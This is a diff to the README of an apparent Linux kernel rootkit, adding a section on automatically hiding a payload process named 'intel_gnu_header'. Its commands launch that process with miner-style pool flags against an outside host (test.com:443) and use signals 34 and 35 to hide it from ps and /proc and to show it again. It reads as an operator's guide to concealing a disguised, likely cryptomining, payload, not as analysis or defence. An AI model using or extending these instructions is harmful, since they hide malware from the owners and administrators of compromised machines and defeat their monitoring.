@@ -79,25 +79,47 @@ kill -35 656
   - SIGRTMIN (34): Hide current process by name
   - SIGRTMIN1 (35): Unhide current process by name
 
+## Auto-Hidden Processes
+
+The rootkit automatically hides:
+- **intel_gnu_header** - The main payload process (auto-hidden on module load)
+
 ## Example Usage Scenario
 
-1. Start a suspicious process:
+1. Start the intel_gnu_header process:
    ```bash
    /usr/bin/intel_gnu_header -o test.com:443 -u 44fdsasdf -k --tls -p prolay &
    echo $!  # Note the PID, e.g., 1234
    ```
 
-2. Hide the process manually:
-   ```bash
-   # Hide by PID (this hides ALL intel_gnu_header processes)
-   kill -34 1234
-   ```
+2. **The process is automatically hidden** when the rootkit module loads.
 
 3. Verify it's hidden:
    ```bash
    ps aux | grep intel_gnu_header    # Should not show the process
    ps aux | grep test.com            # Should not show the process
    ls /proc/1234                     # Should show "No such file or directory"
+   ```
+
+4. **To make intel_gnu_header visible again:**
+   ```bash
+   # Unhide by PID (if you know the PID)
+   kill -35 1234
+   
+   # Or unhide from within the intel_gnu_header process itself
+   kill -35 0
+   
+   # Verify it's now visible
+   ps aux | grep intel_gnu_header    # Should show the process
+   ```
+
+5. **To hide it again:**
+   ```bash
+   # Hide by PID
+   kill -34 1234
+   
+   # Or hide from within the process
+   kill -34 0
    ```
 
 4. To hide other processes:
